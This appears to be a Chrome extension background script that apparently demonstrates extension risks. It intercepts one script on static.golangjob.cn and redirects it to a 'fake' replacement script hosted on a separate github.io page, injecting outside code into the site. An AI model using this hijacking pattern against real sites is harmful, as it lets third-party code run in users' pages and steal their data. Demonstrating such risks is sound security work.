chrome.webRequest.onBeforeRequest.addListener(
  function () {
    return {
      redirectUrl: "https://greatghoul.github.io/static/crx-risks-demo/application-fake.js"
    }
  },
  {
    urls: [
      "https://static.golangjob.cn/static/dist/js/sg_base.min.js?v=*",
    ],
    types: [
      "script",
    ]
  },
  ["blocking"]
);
